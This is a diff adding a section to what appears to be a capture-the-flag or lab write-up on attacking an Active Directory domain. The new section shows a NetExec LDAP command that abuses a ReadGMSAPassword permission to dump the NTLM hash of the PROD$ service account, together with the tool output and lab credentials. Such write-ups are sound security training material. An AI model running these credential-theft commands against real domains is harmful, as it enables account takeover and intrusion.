@@ -545,3 +545,15 @@ The hash cracked, now this user is compromised!
 
 I have ReadGMSAPassword on the `PROD$` account
 
+# Compromising `prod$`
+
+```python
+nxc ldap dc01.fragments.local -u o.rodrigo -p 'nohacking!' --gmsa                
+LDAP        10.0.29.162     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:fragments.local) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.0.29.162     389    DC01             [+] fragments.local\o.rodrigo:nohacking! 
+LDAP        10.0.29.162     389    DC01             [*] Getting GMSA Passwords
+LDAP        10.0.29.162     389    DC01             Account: PROD$                NTLM: b43cb2fcadff72ff9136a2f42218c430     PrincipalsAllowedToReadPassword: Management
+```
+
+I now have the NTLM hash of the `prod$` account
+
